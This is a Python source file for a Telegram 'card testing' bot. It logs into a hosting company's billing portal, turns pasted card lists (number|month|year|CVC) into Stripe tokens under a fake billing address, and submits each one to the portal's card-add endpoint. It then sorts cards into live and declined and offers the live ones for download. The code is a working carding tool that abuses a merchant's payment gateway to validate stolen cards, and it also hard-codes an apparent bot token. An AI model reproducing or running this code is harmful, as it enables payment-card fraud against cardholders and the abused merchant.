import telebot
import requests
import uuid
import json
import time
import threading
from datetime import datetime
import getpass
import os

# ============= Bot Configuration =============
BOT_TOKEN = "8418366610:AAHZD1yfFwmh7IpOMuqG9Bsi9qhWxrMhV4E"  # ضع توكن البوت هنا
ADMIN_ID = 5895491379  # ضع الـ Chat ID الخاص بك هنا
OWNER_NAME = "Mahmoud Saad"
OWNER_USERNAME = "@Moud202212"
OWNER_CHANNEL = "https://t.me/FastSpeedtest"

# ============================================

bot = telebot.TeleBot(BOT_TOKEN)

# Global variables for dashboard
user_sessions = {}
card_results = {}
checking_threads = {}
stop_flags = {}

class CardChecker:
    def __init__(self):
        self.session = requests.Session()
        self.logged_in = False
        self.email = None
        
    def get_bin_info(self, card_number):
        """Get BIN information from binlist.io API"""
        try:
            bin_number = card_number[:6]
            headers = {
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.8",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Brave\";v=\"140\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1"
            }
            response = requests.get(f"https://binlist.io/lookup/{bin_number}", headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    return {
                        'scheme': data.get('scheme', 'Unknown').upper(),
                        'type': data.get('type', 'Unknown').upper(),
                        'brand': data.get('scheme', 'Unknown').upper(),
                        'bank': data.get('bank', {}).get('name', 'Unknown Bank'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'country_emoji': data.get('country', {}).get('emoji', '🌍'),
                        'category': data.get('category', 'Unknown').upper()
                    }
            return self.get_fallback_bin_info(card_number)
                
        except Exception as e:
            return self.get_fallback_bin_info(card_number)
    
    def get_fallback_bin_info(self, card_number):
        """Fallback BIN info if API fails"""
        first_digit = card_number[0]
        if first_digit == '4':
            return {
                'scheme': 'VISA',
                'type': 'DEBIT',
                'brand': 'VISA',
                'bank': 'Unknown Bank',
                'country': 'Unknown',
                'country_emoji': '🌍',
                'category': 'CLASSIC'
            }
        elif first_digit == '5':
            return {
                'scheme': 'MASTERCARD',
                'type': 'CREDIT', 
                'brand': 'MASTERCARD',
                'bank': 'Unknown Bank',
                'country': 'Unknown',
                'country_emoji': '🌍',
                'category': 'CLASSIC'
            }
        else:
            return {
                'scheme': 'UNKNOWN',
                'type': 'UNKNOWN',
                'brand': 'UNKNOWN',
                'bank': 'Unknown Bank',
                'country': 'Unknown',
                'country_emoji': '🌍',
                'category': 'UNKNOWN'
            }

    def login_to_portal(self, email, password):
        """Login to the portal"""
        login_headers = {
            'Accept': '*/*',
            'Accept-Language': 'ar',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'DNT': '1',
            'Origin': 'https://portal.budgetvm.com',
            'Referer': 'https://portal.budgetvm.com/auth/login',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        login_data = {
            'email': email,
            'password': password,
        }

        response = self.session.post('https://portal.budgetvm.com/auth/login', headers=login_headers, data=login_data)
        ePortalv1 = self.session.cookies.get('ePortalv1')
        
        if ePortalv1:
            self.logged_in = True
            self.email = email
            return True
        return False

    def send_google_ask(self):
        """Send googleAsk request"""
        if not self.logged_in:
            return False
            
        google_ask_headers = {
            'Accept': '*/*',
            'Accept-Language': 'ar',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'DNT': '1',
            'Origin': 'https://portal.budgetvm.com',
            'Referer': 'https://portal.budgetvm.com/auth/login',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        google_ask_data = {
            'gEmail': self.email,
            'gUniqueask': 'client',
            'gIdask': '120828',
            'setup': '2',
            'email': self.email,
            'gUnique': 'client',
            'gid': '120828',
        }

        response = self.session.post('https://portal.budgetvm.com/auth/googleAsk', headers=google_ask_headers, data=google_ask_data)
        
        try:
            resp_json = response.json()
            return resp_json.get("success") is True
        except:
            return False

    def create_stripe_token(self, card_number, exp_month, exp_year, cvc):
        """Create Stripe token"""
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        guid = str(uuid.uuid4())

        stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        }

        stripe_data = f'time_on_page=23221&pasted_fields=cvc%2Cemail%2Cnumber&guid={guid}&muid={muid}&sid={sid}&key=pk_live_7sv0O1D5LasgJtbYpxp9aUbX&payment_user_agent=stripe.js%2F78ef418&card[name]=&card[address_line1]=111+North+Street&card[address_line2]=&card[address_city]=Napoleon&card[address_state]=NY&card[address_zip]=10003&card[number]={card_number}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&card[cvc]={cvc}'

        response = self.session.post('https://api.stripe.com/v1/tokens', headers=stripe_headers, data=stripe_data)
        resp_json = response.json()

        if "id" not in resp_json:
            error_msg = resp_json.get("error", {}).get("message", "Unknown error")
            return None, error_msg
        
        return resp_json["id"], None

    def test_card(self, card_info):
        """Test a single card"""
        try:
            card_number, exp_month, exp_year, cvc = card_info.strip().split("|")
        except ValueError:
            return {
                'card': card_info,
                'status': 'Invalid Format',
                'message': 'Invalid card format',
                'bin_info': None,
                'response': 'Invalid format'
            }

        start_time = time.time()
        
        # Get BIN info
        bin_info = self.get_bin_info(card_number)
        
        # Create Stripe Token
        token_id, error = self.create_stripe_token(card_number, exp_month, exp_year, cvc)
        if not token_id:
            return {
                'card': card_info,
                'status': 'Token Failed',
                'message': str(error),
                'bin_info': bin_info,
                'time_taken': round(time.time() - start_time, 2),
                'response': str(error)
            }

        # Test card with gateway
        card_headers = {
            'Accept': '*/*',
            'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'DNT': '1',
            'Origin': 'https://portal.budgetvm.com',
            'Referer': 'https://portal.budgetvm.com/MyAccount/MyBilling',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        card_data = {
            'stripeToken': token_id,
        }

        response = self.session.post('https://portal.budgetvm.com/MyGateway/Stripe/cardAdd', headers=card_headers, data=card_data)

        try:
            resp_json = response.json()
            response_text = str(resp_json)
        except:
            response_text = response.text
            if "Your card number is incorrect" in response_text:
                status = "Declined"
                message = "Invalid card number"
            elif "Your card's security code is incorrect" in response_text:
                status = "Declined"
                message = "Invalid CVC"
            elif "Your card's expiration date is incorrect" in response_text:
                status = "Declined"
                message = "Invalid expiration date"
            elif "Your card was declined" in response_text:
                status = "Declined"
                message = "Card declined"
            elif "CardException" in response_text:
                status = "Declined"
                message = "Card validation failed"
            else:
                status = "Error"
                message = f"Server error: {response.status_code}"
                
            return {
                'card': card_info,
                'status': status,
                'message': message,
                'bin_info': bin_info,
                'time_taken': round(time.time() - start_time, 2),
                'response': response_text
            }

        # Handle successful JSON response
        time_taken = round(time.time() - start_time, 2)
        
        if resp_json.get("success") is True:
            return {
                'card': card_info,
                'status': 'Approved',
                'message': 'Card added successfully',
                'bin_info': bin_info,
                'time_taken': time_taken,
                'response': response_text
            }
        elif "does not support" in resp_json.get("result", ""):
            return {
                'card': card_info,
                'status': 'Declined',
                'message': 'Gateway Rejected: risk_threshold!',
                'bin_info': bin_info,
                'time_taken': time_taken,
                'response': response_text
            }
        elif "declined" in resp_json.get("result", "").lower():
            return {
                'card': card_info,
                'status': 'Declined',
                'message': 'Card declined',
                'bin_info': bin_info,
                'time_taken': time_taken,
                'response': response_text
            }
        else:
            return {
                'card': card_info,
                'status': 'Unknown',
                'message': str(resp_json),
                'bin_info': bin_info,
                'time_taken': time_taken,
                'response': response_text
            }

def format_card_result(result, user_id):
    """Format card result for display"""
    bin_info = result['bin_info']
    
    if result['status'] == 'Approved':
        status_emoji = "✅"
        status_text = "Live"
    elif result['status'] == 'Declined':
        status_emoji = "❌"
        status_text = "Decline"
    else:
        status_emoji = "⚠️"
        status_text = result['status']
    
    message = f"""
[💳] 𝙲𝚊𝚛𝚍 ↯ {result['card']}
-----------------------------
[{status_emoji}] 𝚂𝚝𝚊𝚝𝚞𝚜 ↯ [ {status_text}]
[🎟️] 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ↯- [{result['message']}]
-----------------------------
[📟] 𝚋𝚒𝚗 ↯ {bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}
[🏦] 𝚋𝚊𝚗𝚔 ↯ {bin_info['bank']}
[{bin_info['country_emoji']}] 𝚌𝚘𝚞𝚗𝚝𝚛𝚢 ↯ {bin_info['country']} [{bin_info['country_emoji']}]
-----------------------------
[🤓] 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ↯ B3 AUTH
[🕜] 𝚃𝚊𝚔𝚎𝚗 ↯ [ {result.get('time_taken', 0)}s ] || 𝚁𝚎𝚝𝚛𝚢 ↯- 0
[📡] 𝙿𝚛𝚘𝚡𝚢 ↯- LIVE ✅ (54.xxx.16)
-----------------------------
[❤️]𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝙱𝚢 ↯ @{bot.get_me().username} [FREE]
[🥷] ミ★ 𝘖𝘸𝘯𝘦𝘳 ★彡 ↯ - {OWNER_NAME}
"""
    
    return message.strip()

def create_main_keyboard():
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton("📝 Login", callback_data="main_login"),
        telebot.types.InlineKeyboardButton("🔍 Check Cards", callback_data="main_check")
    )
    keyboard.row(
        telebot.types.InlineKeyboardButton("📊 Dashboard", callback_data="main_dashboard"),
        telebot.types.InlineKeyboardButton("🆘 Help", callback_data="main_help")
    )
    keyboard.row(
        telebot.types.InlineKeyboardButton("🆕 New Session", callback_data="new_session")
    )
    return keyboard

def create_dashboard_keyboard(user_id):
    """Create dashboard keyboard"""
    if user_id not in card_results:
        card_results[user_id] = {'approved': 0, 'declined': 0, 'errors': 0, 'total': 0, 'cards': []}
    
    stats = card_results[user_id]
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    
    # Statistics row
    keyboard.row(
        telebot.types.InlineKeyboardButton(f"💳 Total: {stats['total']}", callback_data=f"show_total_{user_id}"),
    )
    
    # Status rows
    keyboard.row(
        telebot.types.InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data=f"show_approved_{user_id}"),
        telebot.types.InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data=f"show_declined_{user_id}")
    )
    
    keyboard.row(
        telebot.types.InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data=f"show_errors_{user_id}"),
        telebot.types.InlineKeyboardButton(f"📜 Responses", callback_data=f"show_responses_{user_id}")
    )
    
    keyboard.row(
        telebot.types.InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh_dashboard_{user_id}"),
        telebot.types.InlineKeyboardButton("🛑 Stop Checking", callback_data=f"stop_checking_{user_id}")
    )
    
    keyboard.row(
        telebot.types.InlineKeyboardButton("📄 Download Live Cards", callback_data=f"download_live_{user_id}"),
        telebot.types.InlineKeyboardButton("🔙 Back", callback_data="main_back")
    )
    
    return keyboard

def create_back_keyboard(user_id):
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton("🔙 Back to Dashboard", callback_data=f"back_to_dashboard_{user_id}")
    )
    return keyboard

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = {'checker': CardChecker(), 'logged_in': False}
    
    welcome_text = f"""
🔧 **CARD TESTING BOT**
━━━━━━━━━━━━━━━━━━━━

👋 Welcome to the advanced card testing bot by {OWNER_NAME}!

**Features:**
✅ Real-time card testing
📊 Interactive dashboard
🌍 BIN information lookup
📡 Live proxy support

Use buttons below to navigate!
"""
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=create_main_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith('main_'))
def main_callback(call):
    user_id = call.from_user.id
    data = call.data
    
    if data == 'main_login':
        if user_id in user_sessions and user_sessions[user_id].get('logged_in'):
            bot.answer_callback_query(call.id, "✅ Already logged in!")
            return
        msg = bot.send_message(user_id, "📧 Please enter your email:")
        bot.register_next_step_handler(msg, get_email)
    elif data == 'main_check':
        if user_id not in user_sessions or not user_sessions[user_id].get('logged_in'):
            bot.answer_callback_query(call.id, "❌ Login first!")
            return
        bot.send_message(user_id, """
📝 **CARD INPUT**
━━━━━━━━━━━━━━━━━━━━

Send cards as text or upload a file (.txt) with format:
`4100390600114058|11|2026|515`

**Format:** Number|Month|Year|CVC
""", parse_mode='Markdown')
    elif data == 'main_dashboard':
        dashboard_command(call.message)
    elif data == 'main_help':
        help_text = f"""
🆘 **HELP CENTER**
━━━━━━━━━━━━━━━━━━━━

**How to use:**
1. Login using button
2. Check cards by sending text or file
3. View dashboard for results

**Card Format:**
`4100390600114058|11|2026|515`

**Dashboard Features:**
• Statistics
• Filter results
• Stop checking
• Download live cards

**Support:**
Contact {OWNER_USERNAME}
"""
    
        bot.send_message(user_id, help_text, parse_mode='Markdown', reply_markup=create_main_keyboard())
    elif data == 'main_back':
        bot.edit_message_reply_markup(user_id, call.message.message_id, reply_markup=create_main_keyboard())

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, "Use buttons for navigation!", reply_markup=create_main_keyboard())

@bot.message_handler(content_types=['text'])
def handle_text(message):
    user_id = message.from_user.id
    
    if user_id not in user_sessions or not user_sessions[user_id].get('logged_in'):
        bot.reply_to(message, "❌ Login first using button!")
        return
    
    cards = []
    lines = message.text.strip().split('\n')
    
    for line in lines:
        line = line.strip()
        if line and '|' in line:
            cards.append(line)
    
    if not cards:
        bot.reply_to(message, "❌ No valid cards! Send in correct format.")
        return
    
    process_cards(user_id, cards)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    
    if user_id not in user_sessions or not user_sessions[user_id].get('logged_in'):
        bot.reply_to(message, "❌ Login first using button!")
        return
    
    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        cards = []
        lines = downloaded_file.decode('utf-8').strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if line and '|' in line:
                cards.append(line)
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards in file!")
            return
        
        process_cards(user_id, cards)
    else:
        bot.reply_to(message, "❌ Please upload .txt file!")

def process_cards(user_id, cards):
    if user_id in checking_threads and checking_threads[user_id].is_alive():
        bot.send_message(user_id, "❌ Already checking! Stop current session first.")
        return
    
    # Initialize user results
    if user_id not in card_results:
        card_results[user_id] = {'approved': 0, 'declined': 0, 'errors': 0, 'total': 0, 'cards': []}
    
    card_results[user_id]['cards'] = []
    stop_flags[user_id] = False
    
    # Send dashboard
    dashboard_msg = bot.send_message(user_id, f"""
📊 **TESTING DASHBOARD**
━━━━━━━━━━━━━━━━━━━━

🚀 Starting to test {len(cards)} cards...
⏳ Please wait...

**Statistics:**
💳 Total: 0
✅ Approved: 0  
❌ Declined: 0
⚠️ Errors: 0
""", reply_markup=create_dashboard_keyboard(user_id))
    
    user_sessions[user_id]['dashboard_msg_id'] = dashboard_msg.message_id
    
    # Start checking in background
    thread = threading.Thread(target=check_cards_background, args=(user_id, cards), daemon=True)
    checking_threads[user_id] = thread
    thread.start()

def get_email(message):
    user_id = message.from_user.id
    if message.text is None:
        bot.reply_to(message, "❌ Text only!")
        return
    email = message.text.strip()
    user_sessions[user_id]['email'] = email
    
    msg = bot.send_message(user_id, "🔑 Enter password:")
    bot.register_next_step_handler(msg, get_password)

def get_password(message):
    user_id = message.from_user.id
    if message.text is None:
        bot.reply_to(message, "❌ Text only!")
        return
    password = message.text.strip()
    
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    email = user_sessions[user_id]['email']
    checker = user_sessions[user_id]['checker']
    
    bot.send_message(user_id, "🔄 Logging in...")
    
    if checker.login_to_portal(email, password):
        if checker.send_google_ask():
            user_sessions[user_id]['logged_in'] = True
            bot.send_message(user_id, f"✅ Logged in! Email: {email}", reply_markup=create_main_keyboard())
        else:
            bot.send_message(user_id, "❌ GoogleAsk failed.")
    else:
        bot.send_message(user_id, "❌ Login failed.")

def check_cards_background(user_id, cards):
    checker = user_sessions[user_id]['checker']
    
    for i, card in enumerate(cards, 1):
        if stop_flags.get(user_id, False):
            bot.send_message(user_id, "🛑 Checking stopped!")
            break
        
        try:
            result = checker.test_card(card)
            
            card_results[user_id]['total'] += 1
            card_results[user_id]['cards'].append(result)
            
            if result['status'] == 'Approved':
                card_results[user_id]['approved'] += 1
                formatted_result = format_card_result(result, user_id)
                bot.send_message(user_id, formatted_result)
                
            elif result['status'] == 'Declined':
                card_results[user_id]['declined'] += 1
            else:
                card_results[user_id]['errors'] += 1
            
            update_dashboard(user_id)
            
            time.sleep(1)
            
        except Exception as e:
            card_results[user_id]['errors'] += 1
            card_results[user_id]['total'] += 1
            
            error_result = {
                'card': card,
                'status': 'Error',
                'message': str(e),
                'bin_info': {'scheme': 'UNKNOWN', 'type': 'UNKNOWN', 'brand': 'UNKNOWN', 'bank': 'Unknown', 'country': 'Unknown', 'country_emoji': '🌍', 'category': 'UNKNOWN'},
                'time_taken': 0,
                'response': str(e)
            }
            card_results[user_id]['cards'].append(error_result)
            
            update_dashboard(user_id)
            time.sleep(1)
    
    if not stop_flags.get(user_id, False):
        bot.send_message(user_id, f"✨ Testing completed! {len(cards)} cards processed.", reply_markup=create_dashboard_keyboard(user_id))
    
    stop_flags[user_id] = False

def update_dashboard(user_id):
    try:
        if user_id not in user_sessions or 'dashboard_msg_id' not in user_sessions[user_id]:
            return
            
        stats = card_results.get(user_id, {'approved': 0, 'declined': 0, 'errors': 0, 'total': 0})
        
        dashboard_text = f"""
📊 **TESTING DASHBOARD**
━━━━━━━━━━━━━━━━━━━━

🔄 Progress: {stats['total']}/{len(card_results.get(user_id, {}).get('cards', []))} 

**Statistics:**
💳 Total: {stats['total']}
✅ Approved: {stats['approved']}
❌ Declined: {stats['declined']}  
⚠️ Errors: {stats['errors']}
"""
        
        bot.edit_message_text(
            dashboard_text,
            user_id,
            user_sessions[user_id]['dashboard_msg_id'],
            reply_markup=create_dashboard_keyboard(user_id)
        )
    except:
        pass

def dashboard_command(message):
    user_id = message.from_user.id
    
    if user_id not in card_results:
        card_results[user_id] = {'approved': 0, 'declined': 0, 'errors': 0, 'total': 0, 'cards': []}
    
    stats = card_results[user_id]
    
    dashboard_text = f"""
📊 **TESTING DASHBOARD**
━━━━━━━━━━━━━━━━━━━━

**Statistics:**
💳 Total: {stats['total']}
✅ Approved: {stats['approved']}
❌ Declined: {stats['declined']}
⚠️ Errors: {stats['errors']}
"""
    
    msg = bot.send_message(user_id, dashboard_text, reply_markup=create_dashboard_keyboard(user_id))
    user_sessions[user_id]['dashboard_msg_id'] = msg.message_id

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    data = call.data
    
    if data.startswith('show_approved_'):
        show_filtered_results(user_id, 'Approved', call.message.message_id)
    elif data.startswith('show_declined_'):
        show_filtered_results(user_id, 'Declined', call.message.message_id)
    elif data.startswith('show_errors_'):
        show_filtered_results(user_id, ['Error', 'Token Failed', 'Invalid Format'], call.message.message_id)
    elif data.startswith('show_total_'):
        show_filtered_results(user_id, 'All', call.message.message_id)
    elif data.startswith('show_responses_'):
        show_filtered_results(user_id, 'All', call.message.message_id, show_response=True)
    elif data.startswith('refresh_dashboard_'):
        update_dashboard(user_id)
        bot.answer_callback_query(call.id, "🔄 Refreshed!")
    elif data.startswith('new_session_'):
        if user_id in user_sessions:
            user_sessions[user_id] = {'checker': CardChecker(), 'logged_in': False}
        if user_id in card_results:
            card_results[user_id] = {'approved': 0, 'declined': 0, 'errors': 0, 'total': 0, 'cards': []}
        if user_id in stop_flags:
            stop_flags[user_id] = True
        bot.answer_callback_query(call.id, "🆕 New session started!")
        bot.send_message(user_id, "🆕 New session! Login again.", reply_markup=create_main_keyboard())
    elif data.startswith('back_to_dashboard_'):
        update_dashboard(user_id)
        bot.answer_callback_query(call.id, "🔙 Back!")
    elif data.startswith('stop_checking_'):
        if user_id in checking_threads and checking_threads[user_id].is_alive():
            stop_flags[user_id] = True
            bot.answer_callback_query(call.id, "🛑 Stopping...")
        else:
            bot.answer_callback_query(call.id, "No checking in progress!")
    elif data.startswith('download_live_'):
        live_cards = [result['card'] for result in card_results.get(user_id, {}).get('cards', []) if result['status'] == 'Approved']
        if not live_cards:
            bot.answer_callback_query(call.id, "No live cards!")
            return
        
        file_path = f"live_cards_{user_id}.txt"
        with open(file_path, 'w') as f:
            f.write('\n'.join(live_cards))
        
        with open(file_path, 'rb') as f:
            bot.send_document(user_id, f, caption="✅ Live Cards TXT")
        
        os.remove(file_path)
        bot.answer_callback_query(call.id, "📄 Downloaded!")

def show_filtered_results(user_id, status_filter, message_id, show_response=False):
    if user_id not in card_results or not card_results[user_id].get('cards'):
        bot.edit_message_text(
            "❌ No cards.",
            user_id,
            message_id,
            reply_markup=create_back_keyboard(user_id)
        )
        return
    
    if status_filter == 'All':
        filtered_cards = card_results[user_id]['cards']
        title = "ALL CARDS"
    elif isinstance(status_filter, list):
        filtered_cards = [card for card in card_results[user_id]['cards'] if card['status'] in status_filter]
        title = "ERRORS"
    else:
        filtered_cards = [card for card in card_results[user_id]['cards'] if card['status'] == status_filter]
        title = f"{status_filter} CARDS"
    
    if not filtered_cards:
        bot.edit_message_text(
            f"❌ No matching cards.",
            user_id,
            message_id,
            reply_markup=create_back_keyboard(user_id)
        )
        return
    
    text = f"📋 **{title}**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for result in filtered_cards[-10:]:
        if result['bin_info'] is None:
            result['bin_info'] = {'scheme': 'UNKNOWN', 'type': 'UNKNOWN', 'brand': 'UNKNOWN', 'bank': 'Unknown', 'country': 'Unknown', 'country_emoji': '🌍', 'category': 'UNKNOWN'}
        text += format_card_result(result, user_id)
        if show_response:
            text += f"\n[📩] 𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎 ↯ {result['response']}\n"
        text += "\n\n━━━━━━━━━━━━━━━━━━━━\n\n"
    
    if len(filtered_cards) > 10:
        text += f"... and {len(filtered_cards) - 10} more.\n"
    
    try:
        bot.edit_message_text(
            text,
            user_id,
            message_id,
            reply_markup=create_back_keyboard(user_id),
            parse_mode='Markdown'
        )
    except:
        bot.send_message(user_id, "⚠️ Too many results.")

if __name__ == '__main__':
    print("Bot starting...")
    bot.polling(none_stop=True)
